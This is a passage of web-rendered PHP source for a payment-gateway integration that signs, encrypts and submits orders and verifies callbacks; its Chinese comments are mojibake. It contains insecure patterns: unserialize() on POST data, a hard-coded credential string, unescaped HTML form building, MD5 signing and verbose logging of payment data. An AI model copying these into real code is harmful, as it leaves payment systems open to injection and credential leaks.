=&gt; <span class="string">&#x27;2&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;p9_attach&#x27;</span>    =&gt; <span class="string">&#x27;chengyi_&#x27;</span> . <span class="variable">$data</span>[<span class="string">&#x27;payment_id&#x27;</span>],</span><br><span class="line">            <span class="string">&#x27;p10_appname&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;p11_isshow&#x27;</span>   =&gt; <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;p12_orderip&#x27;</span>  =&gt; ip(),</span><br><span class="line">            <span class="string">&#x27;p13_memberid&#x27;</span> =&gt; <span class="variable">$data</span>[<span class="string">&#x27;user_id&#x27;</span>],</span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        payLog(<span class="string">&#x27;chengyi.txt&#x27;</span>,print_r(<span class="variable">$postData</span>,<span class="literal">true</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//å¾…ç­¾åå­—ç¬¦ä¸²</span></span><br><span class="line">        <span class="variable">$signStr</span>   = <span class="keyword">$this</span>-&gt;get_sign(<span class="variable">$postData</span>);</span><br><span class="line">        <span class="comment">//ç”Ÿæˆç­¾å</span></span><br><span class="line">        <span class="variable">$postData</span>[<span class="string">&quot;sign&quot;</span>] = md5(<span class="variable">$signStr</span>.<span class="variable">$config</span>[<span class="string">&#x27;merchantKey&#x27;</span>]);</span><br><span class="line">        <span class="comment">//è½¬ä¸ºjsonå­—ç¬¦ä¸²</span></span><br><span class="line">        <span class="variable">$jsonStr</span>   = json_encode(<span class="variable">$postData</span>);</span><br><span class="line">        <span class="comment">//è·å–å…¬é’¥</span></span><br><span class="line">        <span class="variable">$publicKey</span> = <span class="keyword">$this</span>-&gt;publicKeyStr(<span class="variable">$config</span>[<span class="string">&#x27;merchantPublicKey&#x27;</span>]);</span><br><span class="line">        <span class="comment">//å…¬é’¥åŠ å¯†</span></span><br><span class="line">        <span class="variable">$reqdata</span>   = urlencode(<span class="keyword">$this</span>-&gt;publicEncrypt(<span class="variable">$publicKey</span>, <span class="variable">$jsonStr</span>));</span><br><span class="line">        <span class="comment">//è¯·æ±‚å‚æ•°</span></span><br><span class="line">        <span class="variable">$signData</span>[<span class="string">&quot;mchtid&quot;</span>]  = <span class="variable">$config</span>[<span class="string">&#x27;merchantID&#x27;</span>];</span><br><span class="line">        <span class="variable">$signData</span>[<span class="string">&quot;reqdata&quot;</span>] = <span class="variable">$reqdata</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//åˆ¤æ–­æ”¯ä»˜ç½‘å…³æ˜¯å¦æ˜¯wap</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$config</span>[<span class="string">&#x27;payType&#x27;</span>][<span class="variable">$data</span>[<span class="string">&#x27;pay_type&#x27;</span>]][<span class="string">&#x27;request_type&#x27;</span>] == <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="variable">$retData</span> =  [</span><br><span class="line">                <span class="string">&#x27;type&#x27;</span>  =&gt; <span class="variable">$config</span>[<span class="string">&#x27;payType&#x27;</span>][<span class="variable">$data</span>[<span class="string">&#x27;pay_type&#x27;</span>]][<span class="string">&#x27;request_type&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;modes&#x27;</span> =&gt; <span class="variable">$data</span>[<span class="string">&#x27;pay_model&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;html&#x27;</span>  =&gt; <span class="keyword">$this</span>-&gt;paramToHtmlForm(<span class="keyword">$this</span>-&gt;url, <span class="variable">$signData</span>)</span><br><span class="line">            ];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">$this</span>-&gt;retArr[<span class="string">&#x27;code&#x27;</span>] = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;retArr[<span class="string">&#x27;data&#x27;</span>]  = <span class="variable">$retData</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;retArr;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//å‘èµ·è¯·æ±‚</span></span><br><span class="line">        <span class="variable">$result</span> = <span class="keyword">$this</span>-&gt;httpRequest(<span class="keyword">$this</span>-&gt;url, json_encode(<span class="variable">$signData</span>));</span><br><span class="line">        <span class="comment">//å°†jsonå­—ç¬¦ä¸²è½¬ä¸ºæ•°ç»„</span></span><br><span class="line">        <span class="variable">$resultArr</span> = json_decode(<span class="variable">$result</span>,<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//åˆ¤æ–­è¿”å›ä¿¡æ¯</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$resultArr</span>[<span class="string">&#x27;rspCode&#x27;</span>] != <span class="number">1</span> &amp;&amp; !<span class="variable">$resultArr</span>[<span class="string">&#x27;data&#x27;</span>]) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;retArr[<span class="string">&#x27;code&#x27;</span>] = <span class="number">219002</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;retArr[<span class="string">&#x27;msg&#x27;</span>]  = <span class="string">&#x27;æ”¯ä»˜äºŒç»´ç ç”Ÿæˆå¤±è´¥ï¼&#x27;</span>;</span><br><span class="line">            payLog(<span class="string">&#x27;payerror.log&#x27;</span>, <span class="string">&#x27;ï¼ˆ&#x27;</span> . <span class="keyword">$this</span>-&gt;retArr[<span class="string">&#x27;code&#x27;</span>] . <span class="string">&#x27;ï¼‰&#x27;</span> . <span class="keyword">$this</span>-&gt;payName . <span class="variable">$resultArr</span>[<span class="string">&quot;rspMsg&quot;</span>] . print_r(<span class="variable">$resultArr</span>, <span class="literal">true</span>));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;retArr;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$resultData</span> = <span class="variable">$resultArr</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line">        <span class="comment">//éªŒç­¾</span></span><br><span class="line">        <span class="variable">$re</span> = <span class="keyword">$this</span>-&gt;payVerify(<span class="variable">$resultData</span>, <span class="variable">$config</span>[<span class="string">&#x27;merchantKey&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$re</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;retArr[<span class="string">&#x27;code&#x27;</span>] = <span class="number">219003</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;retArr[<span class="string">&#x27;msg&#x27;</span>]  = <span class="string">&#x27;æ”¯ä»˜äºŒç»´ç ç”Ÿæˆå¤±è´¥ï¼&#x27;</span>;</span><br><span class="line"></span><br><span class="line">            payLog(<span class="string">&#x27;payerror.log&#x27;</span>, <span class="string">&#x27;ï¼ˆ&#x27;</span> . <span class="keyword">$this</span>-&gt;retArr[<span class="string">&#x27;code&#x27;</span>] . <span class="string">&#x27;ï¼‰&#x27;</span> . <span class="keyword">$this</span>-&gt;payName . <span class="string">&#x27;éªŒç­¾å¤±è´¥&#x27;</span> . print_r(<span class="variable">$resultArr</span>, <span class="literal">true</span>));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;retArr;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        payLog(<span class="string">&#x27;chengyi.txt&#x27;</span>,print_r(<span class="variable">$resultData</span>, <span class="literal">true</span>). <span class="string">&quot;===134&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="variable">$retOderNo</span>           = <span class="variable">$orderInfo</span>;</span><br><span class="line">        <span class="variable">$retOderPayNo</span>        = <span class="keyword">isset</span>(<span class="variable">$resultData</span>[<span class="string">&#x27;r2_systemorderno&#x27;</span>]) ? <span class="variable">$resultData</span>[<span class="string">&#x27;r2_systemorderno&#x27;</span>] : <span class="string">&#x27;chengyipay&#x27;</span> . date(<span class="string">&#x27;YmdHis&#x27;</span>);</span><br><span class="line">        <span class="variable">$retOderPayQrcodrUrl</span> = <span class="keyword">isset</span>(<span class="variable">$resultData</span>[<span class="string">&#x27;r6_qrcode&#x27;</span>]) ? <span class="variable">$resultData</span>[<span class="string">&#x27;r6_qrcode&#x27;</span>] : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$result</span> = D(<span class="string">&#x27;accountRecharge&#x27;</span>)-&gt;getOneCoupon(<span class="string">&#x27;id&#x27;</span>, <span class="keyword">array</span>(<span class="string">&#x27;order_sn&#x27;</span> =&gt; <span class="variable">$retOderNo</span>, <span class="string">&#x27;status&#x27;</span> =&gt; <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$result</span>)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;retArr[<span class="string">&#x27;code&#x27;</span>] = <span class="number">219004</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;retArr[<span class="string">&#x27;msg&#x27;</span>]  = <span class="string">&#x27;æ”¯ä»˜äºŒç»´ç ç”Ÿæˆå¤±è´¥ï¼&#x27;</span>;</span><br><span class="line">            payLog(<span class="string">&#x27;payerror.log&#x27;</span>, <span class="string">&#x27;ï¼ˆ&#x27;</span> . <span class="keyword">$this</span>-&gt;retArr[<span class="string">&#x27;code&#x27;</span>] . <span class="string">&#x27;ï¼‰&#x27;</span> . <span class="keyword">$this</span>-&gt;payName . <span class="string">&#x27;è¿”å›æ•°æ®æˆåŠŸ,ä½†è®¢å•è¡¨æ²¡æœ‰æŸ¥åˆ°ç›¸åº”æœªå®Œæˆçš„è®¢å•å·ï¼Œ&#x27;</span> . print_r(<span class="variable">$resultArr</span>, <span class="literal">true</span>));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;retArr;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        D(<span class="string">&#x27;accountRecharge&#x27;</span>)-&gt;save([<span class="string">&#x27;remark&#x27;</span> =&gt; <span class="variable">$retOderPayNo</span>], [<span class="string">&#x27;order_sn&#x27;</span> =&gt; <span class="variable">$retOderNo</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ç”¨äºå®‰å…¨éªŒè¯è¿”å›urlæ˜¯å¦éæ³•</span></span><br><span class="line">        <span class="variable">$shortQrcodrUrl</span> =<span class="keyword">$this</span>-&gt;shortUrl(<span class="variable">$retOderPayQrcodrUrl</span>, <span class="string">&#x27;5cf1028991d2c405942b1569@f15436319999938d84e5f8b7d25e9dda&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$shortQrcodrUrl</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;retArr[<span class="string">&#x27;code&#x27;</span>] = <span class="number">219005</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;retArr[<span class="string">&#x27;msg&#x27;</span>]  = <span class="string">&#x27;æ”¯ä»˜äºŒç»´ç ç”Ÿæˆå¤±è´¥ï¼&#x27;</span>;</span><br><span class="line">            payLog(<span class="string">&#x27;payerror.log&#x27;</span>, <span class="string">&#x27;ï¼ˆ&#x27;</span> . <span class="keyword">$this</span>-&gt;retArr[<span class="string">&#x27;code&#x27;</span>] . <span class="string">&#x27;ï¼‰&#x27;</span> . <span class="keyword">$this</span>-&gt;payName . <span class="string">&#x27;äºŒç»´ç è·å–æˆåŠŸï¼Œä½†è½¬æ¢çŸ­é“¾æ¥å¤±è´¥&#x27;</span> . print_r(<span class="variable">$resultArr</span>, <span class="literal">true</span>));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;retArr;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        session::set(<span class="string">&#x27;qrcode_url&#x27;</span>, <span class="variable">$shortQrcodrUrl</span>);</span><br><span class="line">        session::set(<span class="string">&#x27;pay_url&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//type =1 è¿”å›äºŒç»´ç æ•°æ®</span></span><br><span class="line">        <span class="variable">$ret</span> =  [</span><br><span class="line">            <span class="string">&#x27;type&#x27;</span>     =&gt; <span class="variable">$config</span>[<span class="string">&#x27;payType&#x27;</span>][<span class="variable">$data</span>[<span class="string">&#x27;pay_type&#x27;</span>]][<span class="string">&#x27;request_type&#x27;</span>],</span><br><span class="line">            <span class="string">&#x27;code_url&#x27;</span> =&gt; <span class="variable">$shortQrcodrUrl</span>,</span><br><span class="line">            <span class="string">&#x27;pay_url&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;order_no&#x27;</span> =&gt; <span class="variable">$orderInfo</span>,</span><br><span class="line">            <span class="string">&#x27;modes&#x27;</span>    =&gt; <span class="variable">$data</span>[<span class="string">&#x27;pay_model&#x27;</span>]</span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;retArr[<span class="string">&#x27;code&#x27;</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;retArr[<span class="string">&#x27;data&#x27;</span>] = <span class="variable">$ret</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;retArr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * æ”¯ä»˜å›è°ƒå¤„ç†</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $postData dataï¼šå›è°ƒè¿”å›çš„æ•°æ®ï¼Œpayment_Idï¼šæ”¯ä»˜ç±»å‹ID</span></span><br><span class="line"><span class="comment">     * &#123;<span class="doctag">@inheritDoc</span>&#125;</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@see</span> PayInfo::doPaycallBack()</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array $this-&gt;$retArr;</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">doPaycallBack</span>(<span class="params"><span class="variable">$postData</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//æ¥æ”¶å›è°ƒå è¿”å› ok;</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;ok&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//å¤„ç†postå›è°ƒæ•°æ®</span></span><br><span class="line">        <span class="variable">$data</span>       = json_decode(<span class="variable">$postData</span>[<span class="string">&#x27;data&#x27;</span>], <span class="literal">true</span>);</span><br><span class="line">        <span class="variable">$reqdata</span>    = <span class="variable">$data</span>[<span class="string">&#x27;reqdata&#x27;</span>];</span><br><span class="line">        <span class="variable">$config</span>     = unserialize(<span class="variable">$postData</span>[<span class="string">&#x27;config&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">        payLog(<span class="string">&#x27;chengyi.txt&#x27;</span>,print_r(<span class="variable">$postData</span>, <span class="literal">true</span>).<span class="string">&#x27;----996--&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//åˆ¤æ–­å­—ç¬¦ä¸²æ˜¯å¦éœ€è¦ urldecodeè§£</span></span><br><span class="line">        <span class="keyword">if</span> (strpos(<span class="variable">$reqdata</span>, <span class="string">&#x27;%&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$reqdata</span> =  urldecode(<span class="variable">$reqdata</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!is_array(<span class="variable">$config</span>)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;orderInfo[<span class="string">&#x27;code&#x27;</span>] = <span class="number">219020</span>;</span><br><span class="line">            payLog(<span class="string">&#x27;payerror.log&#x27;</span>, <span class="string">&#x27;ï¼ˆ&#x27;</span> . <span class="keyword">$this</span>-&gt;orderInfo[<span class="string">&#x27;code&#x27;</span>] . <span class="string">&#x27;ï¼‰æ”¯ä»˜å¼‚æ­¥é€šçŸ¥,è·å–æ•°æ®åº“é…ç½®é”™è¯¯ï¼&#x27;</span>  . print_r(<span class="variable">$data</span>, <span class="literal">true</span>));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;orderInfo;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$reqdata</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;orderInfo[<span class="string">&#x27;code&#x27;</span>] = <span class="number">219021</span>;</span><br><span class="line">            payLog(<span class="string">&#x27;payerror.log&#x27;</span>, <span class="string">&#x27;ï¼ˆ&#x27;</span> . <span class="keyword">$this</span>-&gt;orderInfo[<span class="string">&#x27;code&#x27;</span>] . <span class="string">&#x27;ï¼‰æ”¯ä»˜å¼‚æ­¥é€šçŸ¥:è·å–é‡è¦å‚æ•°é”™è¯¯ï¼&#x27;</span>  . print_r(<span class="variable">$data</span>, <span class="literal">true</span>));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;orderInfo;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//è·å–ç§é’¥</span></span><br><span class="line">        <span class="variable">$private_key</span> = <span class="keyword">$this</span>-&gt;privateKeyStr(<span class="variable">$config</span>[<span class="string">&#x27;merchantPrivateKey&#x27;</span>]);</span><br><span class="line">        <span class="comment">//è§£å¯†</span></span><br><span class="line">        <span class="variable">$dataJson</span>    = <span class="keyword">$this</span>-&gt;privateDecrypt(<span class="variable">$reqdata</span>, <span class="variable">$private_key</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$dataJson</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;orderInfo[<span class="string">&#x27;code&#x27;</span>] = <span class="number">219022</span>;</span><br><span class="line">            payLog(<span class="string">&#x27;payerror.log&#x27;</span>, <span class="string">&#x27;ï¼ˆ&#x27;</span> . <span class="keyword">$this</span>-&gt;orderInfo[<span class="string">&#x27;code&#x27;</span>] . <span class="string">&#x27;ï¼‰æ”¯ä»˜å¼‚æ­¥é€šçŸ¥ï¼šæ”¯ä»˜è§£å¯†å¤±è´¥ï¼&#x27;</span>  . print_r(<span class="variable">$data</span>, <span class="literal">true</span>));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;orderInfo;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$arr</span> = json_decode(<span class="variable">$dataJson</span>, <span class="literal">true</span>);</span><br><span class="line">        <span class="variable">$arr</span>[<span class="string">&#x27;partner&#x27;</span>] = <span class="variable">$config</span>[<span class="string">&#x27;merchantID&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">//å»é™¤ä¸éœ€è¦å‚å…¥éªŒç­¾çš„å­—æ®µ</span></span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$arr</span>[<span class="string">&quot;sysnumber&quot;</span>]);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$arr</span>[<span class="string">&quot;attach&quot;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//éªŒè¯ç­¾å</span></span><br><span class="line">        <span class="variable">$re</span> = <span class="keyword">$this</span>-&gt;payVerify(<span class="variable">$arr</span>, <span class="variable">$config</span>[<span class="string">&#x27;merchantKey&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$re</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;orderInfo[<span class="string">&#x27;code&#x27;</span>] = <span class="number">219023</span>;</span><br><span class="line">            payLog(<span class="string">&#x27;payerror.log&#x27;</span>, <span class="string">&#x27;ï¼ˆ&#x27;</span> . <span class="keyword">$this</span>-&gt;orderInfo[<span class="string">&#x27;code&#x27;</span>] . <span class="string">&#x27;ï¼‰æ”¯ä»˜å¼‚æ­¥é€šçŸ¥ï¼šéªŒç­¾å¤±è´¥ï¼&#x27;</span>  . print_r(<span class="variable">$arr</span>, <span class="literal">true</span>));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;orderInfo;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$arr</span>[<span class="string">&#x27;orderstatus&#x27;</span>]) || <span class="variable">$arr</span>[<span class="string">&#x27;orderstatus&#x27;</span>] != <span class="number">1</span> ) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;orderInfo[<span class="string">&#x27;code&#x27;</span>] = <span class="number">219024</span>;</span><br><span class="line">            payLog(<span class="string">&#x27;payerror.log&#x27;</span>, <span class="string">&#x27;ï¼ˆ&#x27;</span> . <span class="keyword">$this</span>-&gt;orderInfo[<span class="string">&#x27;code&#x27;</span>] . <span class="string">&#x27;ï¼‰æ”¯ä»˜å¼‚æ­¥é€šçŸ¥ï¼šæ”¯ä»˜å¤±è´¥ï¼&#x27;</span>  . print_r(<span class="variable">$data</span>, <span class="literal">true</span>));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;orderInfo;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;orderInfo[<span class="string">&#x27;code&#x27;</span>]  = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;orderInfo[<span class="string">&#x27;order_no&#x27;</span>]  = <span class="variable">$data</span>[<span class="string">&#x27;ordernumber&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;orderInfo[<span class="string">&#x27;amount&#x27;</span>]    = <span class="variable">$data</span>[<span class="string">&#x27;paymoney&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;orderInfo[<span class="string">&#x27;serial_no&#x27;</span>] = <span class="variable">$data</span>[<span class="string">&#x27;sysnumber&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;orderInfo;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * [get_sign æ‹¼æ¥ç­¾åå­—ç¬¦ä¸²]</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  [type] $arr æ•°ç»„</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> [type]      [description]</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">get_sign</span>(<span class="params"><span class="variable">$arr</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"><span class="variable">$signmd5</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$arr</span> <span class="keyword">as</span> <span class="variable">$x</span>=&gt;<span class="variable">$x_value</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$signmd5</span>==<span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line"><span class="variable">$signmd5</span> =<span class="variable">$signmd5</span>.<span class="variable">$x</span> .<span class="string">&#x27;=&#x27;</span>. <span class="variable">$x_value</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$signmd5</span> = <span class="variable">$signmd5</span>.<span class="string">&#x27;&amp;&#x27;</span>.<span class="variable">$x</span> .<span class="string">&#x27;=&#x27;</span>. <span class="variable">$x_value</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$signmd5</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * [publicKeyStr å…¬é’¥å­—ç¬¦ä¸²å¤„ç†]</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  [type] $publicStr å…¬é’¥å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> [type]            [description]</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span>   <span class="function"><span class="keyword">function</span> <span class="title">publicKeyStr</span>(<span class="params"><span class="variable">$publicStr</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$public_key</span> = <span class="string">&quot;-----BEGIN PUBLIC KEY-----\r\n&quot;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (str_split(<span class="variable">$publicStr</span>,<span class="number">64</span>) <span class="keyword">as</span> <span class="variable">$str</span>)&#123;</span><br><span class="line">            <span class="variable">$public_key</span> .= <span class="variable">$str</span> . <span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$public_key</span> .=<span class="string">&quot;-----END PUBLIC KEY-----&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$public_key</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">      * [publicEncrypt å…¬é’¥åŠ å¯†]</span></span><br><span class="line"><span class="comment">      * <span class="doctag">@param</span>  [type] $publicKey å…¬é’¥</span></span><br><span class="line"><span class="comment">      * <span class="doctag">@param</span>  [type] $data      åŠ å¯†å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="comment">      * <span class="doctag">@return</span> [type]            [description]</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">      <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">publicEncrypt</span>(<span class="params"><span class="variable">$publicKey</span>, <span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">        <span class="variable">$key</span> = openssl_get_publickey(<span class="variable">$publicKey</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$original_arr</span> = str_split(<span class="variable">$data</span>,<span class="number">117</span>);</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$original_arr</span> <span class="keyword">as</span> <span class="variable">$o</span>) &#123;</span><br><span class="line">            <span class="variable">$sub_enc</span> = <span class="literal">null</span>;</span><br><span class="line">            openssl_public_encrypt(<span class="variable">$o</span>,<span class="variable">$sub_enc</span>,<span class="variable">$key</span>);</span><br><span class="line">            <span class="variable">$original_enc_arr</span>[] = <span class="variable">$sub_enc</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        openssl_free_key(<span class="variable">$key</span>);</span><br><span class="line">        <span class="variable">$original_enc_str</span> = base64_encode(implode(<span class="string">&#x27;&#x27;</span>,<span class="variable">$original_enc_arr</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$original_enc_str</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * [paramToHtmlForm formè¡¨å•æ–¹æ³•]</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  [type] $url    è¯·æ±‚URL</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  [type] $params æ•°ç»„ è¯·æ±‚å‚æ•°</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> [type]         [description]</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">paramToHtmlForm</span>(<span class="params"><span class="variable">$url</span>,<span class="variable">$params</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$def_url</span> = <span class="string">&quot;&lt;form id=&#x27;form&#x27; name=&#x27;payForm&#x27; action=&#x27;&quot;</span>.<span class="variable">$url</span>.<span class="string">&quot;&#x27; method=&#x27;POST&#x27;&gt;\r&quot;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$params</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">            <span class="variable">$def_url</span> .=<span class="string">&quot;&lt;input type=&#x27;hidden&#x27; name=&#x27;&quot;</span>.<span class="variable">$key</span>.<span class="string">&quot;&#x27; value=&#x27;&quot;</span>.<span class="variable">$value</span>.<span class="string">&quot;&#x27;&gt;\r&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$def_url</span> .=<span class="string">&quot;&lt;input type=&#x27;submit&#x27; value=&#x27;ç¡®è®¤æäº¤&#x27;&gt;&lt;/form&gt;&lt;script language=&#x27;javascript&#x27;&gt;window.onload=function()&#123;document.payForm.submit();&#125;&lt;/script&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$def_url</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * [httpRequest httpè¯·æ±‚]</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  [type] $url  è¯·æ±‚URL</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  [type] $data è¯·æ±‚å‚æ•° jsonå­—ç¬¦ä¸²</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> [type]       [description]</span></span><br><span 